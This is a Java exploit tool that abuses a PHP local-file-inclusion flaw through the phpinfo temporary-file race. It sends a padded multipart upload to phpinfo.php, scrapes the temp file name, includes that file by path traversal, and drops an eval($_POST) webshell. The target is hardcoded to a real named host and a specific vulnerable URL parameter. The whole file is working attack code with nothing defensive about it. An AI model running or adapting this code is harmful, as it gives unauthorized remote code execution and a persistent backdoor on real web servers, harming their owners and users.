package com.ms509;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class PhpLfi {

	 /**
	  * @author Chora[ms509]
	  * @param string webshell 想要生成webshell的路径
	  * @param string host		主机地址
	  * @param string include	存在文件包含漏洞的路径
	  * @param string phpinfo	phpinfo页面的地址
	  * @param	int	port		主机端口
	  * @param	int	paddingnum	填充大小
	  */
	public static void main(String[] args) throws Exception
	{
		// TODO Auto-generated method stub
		String webshell = "/cache/wy.php";
		String host = "price.ziroom.com";
		String include = "http://price.ziroom.com/?_p=../../../../../../../..{include}%00.html";
		String phpinfo = "/phpinfo.php";
		int port = 80;
		int paddingnum = 8000;
		String padding = "";String phptmp;String url;String tmp;
		for(int i=0;i<paddingnum;i++)
		{
			padding = padding + "A";
		}
		InetAddress inethost = InetAddress.getByName(host);
		StringBuffer sb = new StringBuffer();
		StringBuffer sb2 = new StringBuffer();
		sb2.append("-----------------------------7dbff1ded0714\r\n");
		sb2.append("Content-Disposition: form-data; name=\"ms509\"; filename=\"wooyun.txt\"\r\n");
		sb2.append("Content-Type: text/plain\r\n");
		sb2.append("\r\n");
		sb2.append("<?php file_put_contents('."+webshell+"','<?php eval($_POST[ms509]);?>') ? print('ms509_true') : print('ms509_false') ?>");
		sb2.append("\r\n");
		sb2.append("-----------------------------7dbff1ded0714");
		sb.append("POST "+phpinfo+"?a="+padding+" HTTP/1.1\r\n");
		sb.append("Cookie: PHPSESSID=f90b76b7840c05076ca235b05f1c4564; ms509cookie="+padding+"\r\n");
		sb.append("Accept: "+padding+"\r\n");
		sb.append("User-agent: "+padding+"\r\n");
		sb.append("Accept-Language: "+padding+"\r\n");
		sb.append("Pragma: "+padding+"\r\n");
		sb.append("Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r\n");
		sb.append("Content-Length: "+String.valueOf(sb2.length())+"\r\n");
		sb.append("Host: "+host+"\r\n\r\n");
		sb.append(sb2);
		String sbs = sb.toString();
		//System.out.println(sb.toString());	
		while(true)
		{
			Socket socket = new Socket(inethost,port);
			PrintWriter out = new PrintWriter(socket.getOutputStream());
			out.write(sbs);
			out.flush();
			String data="";
			while(data.indexOf("</body></html>")<0)
			{
				data = PhpLfi.getData(socket.getInputStream());
				phptmp = PhpLfi.getPhptmp(data);
				if(phptmp!=null)
				{
					url = include.replaceFirst("\\{include}", phptmp);
					tmp = PhpLfi.doGet(url);
					System.out.println(url);
					if(tmp.indexOf("ms509_true")>-1)
					{
						System.out.println("webshell is up!\r\nwebshell is http://"+host+":"+port+webshell);
						System.exit(0);
					}else if(tmp.indexOf("ms509_false")>-1)
					{
						System.out.println("webshell up error!\r\nreason:\r\n"+tmp);
						System.exit(0);
					}
					System.out.println(tmp);
				}
			}
			socket.close();
		}
	}
	public static String getData(InputStream is) throws Exception
	{
		int byteAva = is.available();String data = "";
		if(byteAva>0)
		{
			byte[] tmp2 = new byte[byteAva];
			is.read(tmp2);
			data  = new String(tmp2);
		}
		return data;
	}
	public static String getPhptmp(String data)
	{
		String tmp = null;
		Matcher m = Pattern.compile("\\[tmp_name] =&gt;\\s(.*?)\\s").matcher(data);
		if(m.find())
		{
			tmp = m.group(1);
		}
		return tmp;
	}
	public static String doGet(String url)
	{
		String data = "";
		try {
			URL u = new URL(url);
			InputStream in = u.openStream();
			Scanner scanner = new Scanner(in);
			while(scanner.hasNextLine()) {
				data += scanner.nextLine()+"\r\n";
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			data = "error";
		}
		return data;
	}
}
